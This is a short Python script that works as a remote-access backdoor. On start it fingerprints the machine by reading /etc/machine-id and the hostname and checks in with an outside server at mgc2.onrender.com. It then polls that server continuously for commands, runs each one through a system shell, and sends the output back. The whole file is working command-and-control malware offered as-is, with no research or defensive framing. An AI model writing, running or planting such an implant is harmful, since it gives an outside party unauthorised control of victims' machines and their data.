import subprocess
import requests, time, os, socket, platform

hostname = socket.gethostname()

if platform.system() == "Linux":
    try:
        with open("/etc/machine-id", "r") as f:
            machine_id = f.read().strip()
    except Exception:
        machine_id = hostname
else:
    machine_id = f"{platform.node()}_win_id"

theos = platform.system()

checkinurl = "https://mgc2.onrender.com/checkin"

data2checkin = {
    "machine_id": str(machine_id),
    "hostname": str(hostname),
    "os": theos,
}

response1 = requests.post(checkinurl, json=data2checkin)

SERVER_URL = "https://mgc2.onrender.com"
MAILBOX_ID = str(machine_id)

while True:
    time.sleep(0.2)
    get_url = f"{SERVER_URL}/mailbox/{MAILBOX_ID}"
    response = requests.get(get_url)

    if response.status_code == 200:
        command = response.text.strip()

        if command != "NONE":
            # --- Handle 'cd' commands ---
            if command.startswith("cd "):
                target_dir = command[3:].strip()
                try:
                    os.chdir(target_dir)
                    execution_output = f"Moved to: {os.getcwd()}"
                except Exception as e:
                    execution_output = f"Line failed: {str(e)}"

            # --- Handle all other commands ---
            else:
                print(f"Executing command: {command}")
                try:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=10,
                        cwd=os.getcwd()  # Properly uses the tracked directory
                    )

                    execution_output = result.stdout + result.stderr
                    if not execution_output:
                        execution_output = "(Command executed with no output)"

                except Exception as e:
                    execution_output = f"Execution failed: {str(e)}"

            # --- Moved outside the else block: Always send output back to server ---
            post_url = f"{SERVER_URL}/mailbox/{MAILBOX_ID}/output"
            payload = {
                "output": execution_output
            }

            post_response = requests.post(post_url, json=payload)

            if post_response.status_code == 200:
                print("Output successfully sent back to the server.")
            else:
                print(f"Failed to send output. Server status: {post_response.status_code}")
    else:
        print(f"Waiting for command... (Server status: {response.status_code})")
        time.sleep(2)
